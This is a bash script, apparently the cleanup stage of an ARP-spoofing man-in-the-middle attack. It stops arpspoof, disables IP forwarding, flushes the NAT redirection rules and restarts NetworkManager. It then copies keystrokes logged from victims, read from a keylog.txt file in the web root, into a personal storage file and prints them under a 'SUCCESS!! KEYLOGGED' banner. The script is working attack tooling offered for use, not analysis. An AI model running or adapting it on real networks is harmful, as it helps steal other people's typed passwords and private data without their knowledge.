#!/bin/bash

# This is just for stylising the successful key logged info 
result_box() {
	local message="$1"
	local subtext="$2"
	local green="\e[32m"
	local reset="\e[0m"
	local bell="\a"
	local orange="\e[1;33m"

    # Auto Determine boarder lengths for result box (for fun)
    	local max_len=${#message}
    	if [ ${#subtext} -gt $max_len ]; then
        	max_len=${#subtext}
    	fi

    	local border_len=$((max_len + 4))

    # Print top border
    	printf "${green}%*s\n" "$border_len" '' | tr ' ' '*'

    # Print centered message
    	printf "${green}* %-${max_len}s *\n" "$message"

    # Print centered subtext if it exists
    	if [ -n "$subtext" ]; then
        	printf "${green}* %-${max_len}s *\n" "$subtext"
    	fi

    # Print bottom border and bell
    	printf "${green}%*s\n" "$border_len" '' | tr ' ' '*'
	echo -e "${orange}" "${bell}"
}

echo "[+] Shutting down redirection and restoring network settings..."

# Disable IP forwarding
echo "[+] Disable IP Forwarding..."
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# Kill any arpspoof process running in the background
echo "[+] Killing ARP spoofing processes..."
sudo pkill arpspoof

# Flush NAT iptables rules (redirection)
echo "[+] Flushing iptables NAT rules..."
sudo iptables -t nat -F

# Restart network manager to clear up routes and DNS (optional)
echo "[+] Restarting network manager service..."
sudo systemctl restart NetworkManager

#Append info from keylog.txt to storage in bootcon
echo "[+] Pulling keylog.txt if it exists..."
sudo cat /var/www/html/keylog.txt >> /home/nilla/bootcon/key_logged_info

echo "[✓] MITM attack stopped...system restored...data stored..."
echo ""

# Lets make a hacker man-like ending
red="\e[1;31m"
green="\e[1;32m"
yellow="\e[1;33m"
reset="\e[0m"

# Prompts user to continue when they are brave enough
read -p $'\n\e[1;31m[Press Enter to continue...]\e[0m'

clear

# Dramatic countdown comes with a free pair of hacker-man shades right?
echo -e "\nResults Ready in..:"
sleep 1
echo -e "${green}3${reset}"
sleep 1
echo -e "${yellow}2${reset}"
sleep 1
echo -e "${red}1${reset}"
sleep 0.5
clear


result_box "********  SUCCESS!!  ********" "CURRENT SESSIONS INFO KEYLOGGED!"
sudo cat /var/www/html/keylog.txt
